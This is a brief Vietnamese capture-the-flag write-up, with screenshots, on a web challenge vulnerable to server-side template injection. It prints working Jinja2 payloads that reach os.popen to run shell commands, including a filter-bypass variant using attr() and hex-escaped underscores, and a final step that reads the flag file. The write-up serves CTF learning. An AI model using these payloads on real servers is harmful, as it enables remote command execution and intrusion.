![image](https://github.com/user-attachments/assets/c01b0b45-d68a-4847-8e86-8f27468cc6c4)

Đây là giao diện của web:

![image](https://github.com/user-attachments/assets/5b0def24-fea4-4ea5-81a8-b0531da389c2)

Và nó dính ssti:

![image](https://github.com/user-attachments/assets/8a90be76-bcde-4630-8c64-941b69dbbb04)

Khi tôi dùng `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` thì không được, tôi thấy có vẻ nó filter là ví dụ cả cụm `__import__('os')` thay vì mỗi import hoặc os:

![image](https://github.com/user-attachments/assets/fa885122-aef5-45d0-bd90-cc272a9ae5e6)

Tôi thử dùng burp intruder để dò payload thì ra cái `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

![image](https://github.com/user-attachments/assets/6dbfc930-6c89-4259-adde-2cef91c12b73)

Đổi thành cat flag là ra:

![image](https://github.com/user-attachments/assets/4a49ad61-37b5-446c-b2fc-4218bd1cd1aa)


